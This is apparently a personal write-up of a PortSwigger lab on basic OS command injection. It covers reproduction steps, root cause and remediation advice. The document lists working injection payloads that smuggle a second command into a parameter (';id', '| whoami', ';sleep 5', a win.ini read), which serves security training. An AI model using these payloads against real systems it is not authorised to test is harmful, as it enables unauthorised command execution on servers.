
# PS‑010 — OS Command Injection (basic)

**Date:** $(date +%F)  
**Target:** PortSwigger lab (basic command injection)  
**Impact:** Remote command execution on server-side OS user  
**Status:** Solved

## Summary
User-controllable input is concatenated into a shell command. By injecting a command separator, I executed arbitrary commands (`whoami` / time delay).

## Repro (minimal)
1. Navigate to vulnerable feature (e.g., stock checker / image fetcher).
2. Intercept request in Burp Repeater. Identify the **parameter** (e.g., `storeId`, `ip`, `filename`).
3. Send payloads (see below) and observe output or response time.

## Payloads that worked
- Linux (output): `;id` • `;whoami` • `| id` • `|| id` • `` `id` ``
- Linux (timing): `;sleep 5` • `| sleep 5` • `;ping -c 5 127.0.0.1`
- Windows (if applicable): `& whoami` • `|| type C:\Windows\win.ini` • `&& ping -n 5 127.0.0.1`
- URL-encoded newline (sometimes): `%0a id`

> Notes: try `;`, `|`, `&&`, `||`, backticks; try URL-encoding; try moving payload between params and path.

## Evidence
- Screenshot: [ps-010-screenshot.png](../../evidence/ps-cmdi/ps-010-screenshot.png)  
- Request/response: [ps-010-request.txt](../../evidence/ps-cmdi/ps-010-request.txt)  
- Payload list: [ps-010-payloads.txt](../../evidence/ps-cmdi/ps-010-payloads.txt)

## Root cause
Unvalidated string concatenation into a shell call (`/bin/sh -c "cmd $USERINPUT"`).

## Remediation
- **Do not** build shell strings. Use safe library calls (e.g., spawn/exec with **argument arrays**).
- Maintain **allowlists** (e.g., store IDs only digits).
- Drop shell, sanitize/validate, enforce least privilege, and disable unnecessary utilities.

## Notes
- Lab host redacted as `<lab-host>`.
- Time-based confirmation used when output isn’t reflected.

